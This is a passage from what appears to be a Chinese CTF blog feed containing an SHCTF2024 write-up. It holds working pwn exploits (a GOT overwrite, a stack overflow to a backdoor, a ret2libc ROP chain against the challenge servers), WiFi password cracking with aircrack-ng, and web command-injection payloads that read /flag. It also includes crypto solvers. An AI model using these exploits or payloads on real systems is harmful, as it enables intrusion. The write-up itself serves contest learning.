&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;e &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;: \n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;here \n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># 初始堆分配</span><br>    malloc(<span class="hljs-number">0x700</span>)<br>    malloc(<span class="hljs-number">0x10</span>)<br>    <span class="hljs-comment"># 释放并泄露地址</span><br>    free(<span class="hljs-number">1</span>)<br>    show(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment"># 计算基地址和目标地址</span><br>    libc_base_addr = u64(p.recv(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x21ace0</span><br>    got = libc_base_addr + <span class="hljs-number">0x21A118</span><br>    <span class="hljs-comment"># 覆写GOT表</span><br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    sd(p64(got))<br>    sd(p64(libc_base_addr + libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>    <span class="hljs-comment"># 触发漏洞</span><br>    sla(<span class="hljs-string">&#x27;: &#x27;</span>, <span class="hljs-string">&#x27;5&#x27;</span>)<br>    sl(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    <span class="hljs-comment"># 获取shell</span><br>    ia()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHCTF2024</title>
    <link href="/2024/10/30/shctf/shctf2024/"/>
    <url>/2024/10/30/shctf/shctf2024/</url>
    
    <content type="html"><![CDATA[<p>总排第28名,后续会对web复现</p><h1 id="week1"><a class="markdownIt-Anchor" href="#week1"></a> week1</h1><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="签到题"><a class="markdownIt-Anchor" href="#签到题"></a> 签到题</h3><p>公众号发对应内容就可以得到flag</p><h3 id="rasterizing-traffic"><a class="markdownIt-Anchor" href="#rasterizing-traffic"></a> Rasterizing Traffic</h3><p>给的流量包，wireshark导出全部内容，中间的三个flag拼接是假的</p><p>最后一个导入010得到一个图片，网上搜索了一番知道是光栅隐写吧（是这么叫嘛）直接上exp，会跑出五个图片，拼接一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br>img = np.array(Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>).convert(<span class="hljs-string">&#x27;L&#x27;</span>))  <span class="hljs-comment"># 确保图像是灰度的</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    z = np.zeros_like(img)  <span class="hljs-comment"># 创建全黑图像</span><br>    z[:, i::<span class="hljs-number">5</span>] = img[:, i::<span class="hljs-number">5</span>]  <span class="hljs-comment"># 仅复制每5个像素的列</span><br>    Image.fromarray(z).show()<br></code></pre></td></tr></table></figure><h3 id="拜师之旅1"><a class="markdownIt-Anchor" href="#拜师之旅1"></a> 拜师之旅①</h3><p>给的图片不能正常查看，用010查看给加上正常的png开头给到图片，发现没有flag，crc爆破一下宽高得到flag</p><img src="/../../images/shctf/2024/1.png" alt="1" style="zoom: 33%;"><h3 id="有wifi干嘛不用呢"><a class="markdownIt-Anchor" href="#有wifi干嘛不用呢"></a> 有WiFi干嘛不用呢？</h3><p>简单的学一下</p><p>csv里面给了BSSID: <code>EE:52:37:27:75:EB</code></p><p>may里面应该是密码字典，写个脚本提取一下内容，然后kali进行运行</p><p><code>aircrack-ng 01.cap -w pass.txt -b EE:52:37:27:75:EB -e target</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br>directory = <span class="hljs-string">&#x27;may&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pass.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br>    files = os.listdir(directory)<br>    <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>        file_path = os.path.join(directory, file)<br>        <span class="hljs-keyword">if</span> os.path.isfile(file_path):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    content = f.read()<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(content) &gt; <span class="hljs-number">2</span>:<br>                        modified_content = content[<span class="hljs-number">1</span>:-<span class="hljs-number">2</span>]<br>                    <span class="hljs-keyword">else</span>:<br>                        modified_content = content  <span class="hljs-comment"># 如果文件内容长度不够，则不进行截取</span><br>                    output_file.write(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;modified_content&#125;</span>\n&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取文件 <span class="hljs-subst">&#123;file&#125;</span> 时出错: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;所有文件内容已保存到 pass.txt 中&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/4.png" alt="4"></p><h3 id="真真假假遮遮掩掩"><a class="markdownIt-Anchor" href="#真真假假遮遮掩掩"></a> 真真假假?遮遮掩掩!</h3><p>第一层我直接用伪加密工具Zipcenop进行的然后到了第二层，给了hint,SHCTF???FTCHS，有点眼熟可以进行简单的猜测，最后得出是202410,然后带入解压得到flag，在线掩码爆破也行</p><h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2><h3 id="ezaes"><a class="markdownIt-Anchor" href="#ezaes"></a> EzAES</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 替换为你之前打印的 IV 和 Key</span><br>iv = <span class="hljs-string">b&#x27;\x91\x9c\x9e\x9fP\x98%\xd2&#123;\xbc\xee|\x98c\x00\xd2&#x27;</span>  <span class="hljs-comment"># IV</span><br>key = <span class="hljs-string">b&#x27;\x1b\x16\xd9\xc9\xc9\x10[u\xd5\xbeR\x8f\xd0\x99\xfe\xc0&#x27;</span>  <span class="hljs-comment"># Key</span><br><br><span class="hljs-comment"># 读取密文</span><br>ciphertext = <span class="hljs-string">b&#x27;n\xe0\xe5\xa7W&amp;\x89\x8d\xe5\xbd\xc8\xcf\n]\xbb\xcfF&lt;sm\xae\xb1yY\xaa\x9a\x1a\x93*\x80\xad:Q\xb0\x1d9\xc8w\x08WR\xea\x8c\xca\xd6\x99\xf5\x8b&#x27;</span><br><br><span class="hljs-comment"># 创建 AES 解密对象</span><br>my_aes = AES.new(key, AES.MODE_CBC, iv)<br><br><span class="hljs-comment"># 解密</span><br>plaintext = my_aes.decrypt(ciphertext)<br><br><span class="hljs-comment"># 去掉填充</span><br>plaintext = plaintext.rstrip(<span class="hljs-string">b&#x27; &#x27;</span>)<br><br><span class="hljs-comment"># 输出解密后的明文</span><br><span class="hljs-built_in">print</span>(plaintext)<br></code></pre></td></tr></table></figure><h3 id="hello-crypto"><a class="markdownIt-Anchor" href="#hello-crypto"></a> Hello Crypto</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br>m = <span class="hljs-number">215055650564999213787435370441363980894435533627269060323553651075017072071074685867345899498649872049909340326243097196157</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="baby_mod"><a class="markdownIt-Anchor" href="#baby_mod"></a> baby_mod</h3><p>参考了一下某比赛的wp，需要用到LLL算法，在本地微调之后的脚本如下，不太懂密码，本地的sagemath也不太灵光</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 密文和泄露的信息</span><br>c = <span class="hljs-number">11454421006649444523173181606538145863693301443391411104476020392813188354552215237541156121746758260766189373235006192698011018103423719730694468959224</span><br>c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&quot;018990780114999724489697761346835348813863898197690613747060288212872603755938090881078090944985579244137762398288966180345904956701373459097473470489567378&quot;</span>)<br><br>leak = -<span class="hljs-number">1457239467497770923738554308938779252194103808390298333375049349003518667390622623962565986306781435262634228918675745169896226699428349499145721234</span><br>leak = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(leak) + <span class="hljs-string">&quot;545270574817562202671727008676598472467510294490895807123478089330411790070820510557303676413421705544423508474571278325171268094198633442810872810490979940393221644842305735264574402808330041918352683831517808255366623997677143893057026579&quot;</span>)<br><br>r = <span class="hljs-number">42606828099121205053846991305471624876675634413970417383658101034174961099590991091338816566296815476985911913200609816293298344668685957430209803900543</span><br>r = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(r) + <span class="hljs-string">&quot;7862187841457950962311478142840359604893093112772355204586841584891592754560520121&quot;</span>)<br><br>t = <span class="hljs-number">43431252615108394128004779879998409954355258544308741393719751627109295930373577434186230529781229842377724105486808348002663162365228575615973691647630</span><br>t = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(t) + <span class="hljs-string">&quot;7150053640166059613223862263789840507159058492697264635797552295028685772559578491&quot;</span>)<br><br><span class="hljs-comment"># 构建矩阵</span><br>Ge = Matrix(ZZ, [<br>    [leak, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    [r, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>],<br>    [t, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>],<br>    [-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>^<span class="hljs-number">500</span>]<br>])<br><br><span class="hljs-comment"># 对第一列乘以 2^2000</span><br>Ge[:, <span class="hljs-number">0</span>] *= <span class="hljs-number">2</span>^<span class="hljs-number">2000</span><br><br><span class="hljs-comment"># LLL 约简</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> Ge.LLL():<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:<br>        p, q = <span class="hljs-built_in">abs</span>(line[<span class="hljs-number">1</span>]), <span class="hljs-built_in">abs</span>(line[<span class="hljs-number">2</span>])<br>        n = p * q<br>        d = inverse(Integer(<span class="hljs-number">65537</span>), (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>        <br>        <span class="hljs-comment"># 将 m 转换为标准整数</span><br>        m = <span class="hljs-built_in">pow</span>(c, d, n)<br>        <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><h3 id="factor"><a class="markdownIt-Anchor" href="#factor"></a> factor</h3><p>首先用yafu对N进行分解，然后带入对十选七进行全排列不重复，最后在答案区搜索SHCTF得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> combinations<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> prod<br>primes = [<br>    <span class="hljs-number">10090316943954343501</span>,<br>    <span class="hljs-number">9584538385744661071</span>,<br>    <span class="hljs-number">9882099115896276037</span>,<br>    <span class="hljs-number">12935778997315545353</span>,<br>    <span class="hljs-number">14633606489606944033</span>,<br>    <span class="hljs-number">17359021365807747733</span>,<br>    <span class="hljs-number">10674490894804861513</span>,<br>    <span class="hljs-number">17744376529345008481</span>,<br>    <span class="hljs-number">13075868978049623633</span>,<br>    <span class="hljs-number">14346486611799750539</span><br>]<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">18791760293830179824015973110611716748918716697136891148879107606156801766019039764839524314819248940389704627215761359769781402984529</span><br><br>N = prod(primes)<br><span class="hljs-keyword">for</span> p_list <span class="hljs-keyword">in</span> combinations(primes, <span class="hljs-number">7</span>):<br>    n = prod(p_list)<br>    phi = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> p_list:<br>        phi *= (p - <span class="hljs-number">1</span>)<br>    d = gmpy2.invert(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    flag = long_to_bytes(m)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;组合: <span class="hljs-subst">&#123;p_list&#125;</span>, 解密后的 flag: <span class="hljs-subst">&#123;flag.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/9.png" alt="9"></p><h2 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h2><h3 id="签个到吧"><a class="markdownIt-Anchor" href="#签个到吧"></a> 签个到吧</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c\at /f??? 1&gt;&amp;2<br></code></pre></td></tr></table></figure><h3 id="no-stack-overflow1"><a class="markdownIt-Anchor" href="#no-stack-overflow1"></a> No stack overflow1</h3><p>checksec一下发现有nx保护</p><p><img src="/../../images/shctf/2024/6.png" alt="6"></p><p>ida打开发现有backdoor里面写入了bin/sh</p><p>一个gets的栈溢出，前面加\x00可以绕过，上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&#x27;entry.shc.tf&#x27;</span>,<span class="hljs-number">28055</span>)<br>payload=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x117</span>+p64(<span class="hljs-number">0x4011DB</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="no-stack-overflow2"><a class="markdownIt-Anchor" href="#no-stack-overflow2"></a> No stack overflow2</h3><p>checksec一下开了nx</p><p><img src="/../../images/shctf/2024/13.png" alt="13"></p><p>用ida打开，F5查看伪代码，先看main函数，有大小比较用-1绕过，没有system和sh，溢出点在read函数</p><p>用ROP gadget --binary ‘vuln’ --only ‘pop|ret’ ，查找rdi和ret的地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置连接和ELF文件</span><br>p = remote(<span class="hljs-string">&#x27;210.44.150.15&#x27;</span>, <span class="hljs-number">26065</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vuln&#x27;</span>)<br><br><span class="hljs-comment"># 常量定义</span><br>rdi = <span class="hljs-number">0x0401223</span><br>ret = <span class="hljs-number">0x040101a</span><br>main = <span class="hljs-number">0x401228</span><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment"># 构造第一个payload，泄露puts地址</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.sendline(<span class="hljs-string">b&#x27;-1&#x27;</span>)<br>p.sendline(payload1)<br><br><span class="hljs-comment"># 接收puts地址并计算libc基址</span><br>p.recvuntil(<span class="hljs-string">&#x27;input: &#x27;</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;puts_addr: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&#x27;</span>)<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libcbase = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;libcbase: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libcbase)&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 计算system和&quot;/bin/sh&quot;地址</span><br>sys = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-comment"># 构造第二个payload，执行system(&quot;/bin/sh&quot;)</span><br>p.sendline(<span class="hljs-string">b&quot;-1&quot;</span>)<br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x108</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(sys)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/../../images/shctf/2024/12.png" alt="12"></p><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2><h3 id="1zflask"><a class="markdownIt-Anchor" href="#1zflask"></a> 1zflask</h3><p>先看/robots.txt,再看/s3recttt下载了文件，看一下在/api下面可以执行，进行传参得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?SSHCTFF=<span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure><h3 id="ez_gittt"><a class="markdownIt-Anchor" href="#ez_gittt"></a> ez_gittt</h3><p>githack坏了，用gitdump下来，然后如下操作</p><p><img src="/../../images/shctf/2024/2.png" alt="2"></p><h3 id="蛐蛐蛐蛐"><a class="markdownIt-Anchor" href="#蛐蛐蛐蛐"></a> 蛐蛐?蛐蛐!</h3><p>看源码有提示根据提示前往，然后构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?ququ=0114514<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ququ=ququk1;system(<span class="hljs-string">&#x27;cat /f*&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="jvav"><a class="markdownIt-Anchor" href="#jvav"></a> jvav</h3><p>还没学过java，问gpt跑一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;cat /flag&quot;</span>; <span class="hljs-comment">// 要执行的命令</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> executeCommand(command);<br>        System.out.println(<span class="hljs-string">&quot;Command output: &quot;</span> + result);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">executeCommand</span><span class="hljs-params">(String command)</span> &#123;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(command);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            String line;<br>            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>                output.append(line).append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            reader.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> output.toString().trim();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="poppopop"><a class="markdownIt-Anchor" href="#poppopop"></a> poppopop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SH</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$Web</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$SHCTF</span> = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">flag</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;p)();<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$n</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        SH::<span class="hljs-variable">$Web</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;n;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> 